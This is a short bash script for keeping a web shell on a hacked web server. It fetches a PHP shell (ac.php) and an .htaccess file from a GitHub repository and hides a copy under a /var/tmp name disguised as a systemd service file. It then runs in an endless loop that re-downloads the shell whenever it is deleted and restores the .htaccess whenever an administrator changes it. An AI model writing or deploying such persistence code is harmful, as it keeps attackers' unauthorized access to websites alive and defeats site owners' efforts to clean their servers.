#!/bin/bash
# Dont delete author name :) 
# Telegram : @CallMeRep 
# Sorry if my comment explaination is bad english bcs is write by me not by chatgpt

# Download initial .htaccess and backup shell file
curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a
sleep 2

# Loop to check for changes in files
while true; do
    # Print the Time and Date Before Execution
    echo $(TZ=Asia/Jakarta date)
    # Check if ac.php is exist or no
    if [ ! -f ac.php ] && ! grep -q '@CallMeRep' ac.php; then
        # if not exist will auto get ac.php with this repo ac.php shell links
        curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php
    fi
    # check if .htaccess is readable and writeable and check if htaccess is same with we like import in the first code
    if [ -r .htaccess ] && [ -w .htaccess ] && ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then
        # if not same auto replace the htaccess
        curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess
    fi
    #print the time and date end of execution
    echo $(TZ=Asia/Jakarta date)
    sleep 2
done
